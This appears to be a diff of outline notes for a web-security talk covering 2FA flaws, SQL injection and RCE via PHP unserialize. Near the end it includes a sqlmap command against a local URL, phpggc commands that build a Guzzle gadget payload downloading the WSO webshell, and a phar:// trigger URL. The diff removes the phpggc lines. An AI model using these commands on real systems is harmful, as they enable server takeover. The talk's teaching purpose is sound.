@@ -1,22 +1,4 @@
 
-- Level 1
- - GET based actions
- - Password hashing ???
- - Click jacking
- - 2FA rate limit
- - Password changes
-  - Bypasses 2FA
-  - Doens't log the attacker out?
-  - Same when someone enables 2FA?
- - mySQL injection
-  - Might seem obvious "we all use ORMs, we're not affected"
-   - Have you never had a query that performed so badly, that you re-wrote it in raw SQL?
-   - I never trust user input
-    - What if you don't know it's user input?
- - Open redirects
-- Level 2
- - Timing attacks
- - Session Hijacking/Fixation
 - Level 3
  - RCE via unserialize
   - How it works
@@ -68,8 +50,8 @@
 
 ./sqlmap.py -u http://localhost:8000/wordpress/?referralId=2
 
-[liam@liam phpggc]$ ./phpggc Guzzle/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php" > payload
+[liam@liam phpggc]$
 
-[liam@liam phpggc]$ ./phpggc -pj avatar.jpg Guzzle/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php" -o loaded.jpg
+[liam@liam phpggc]$
 
 http://localhost:8001/image?filename=phar://loaded.jpg
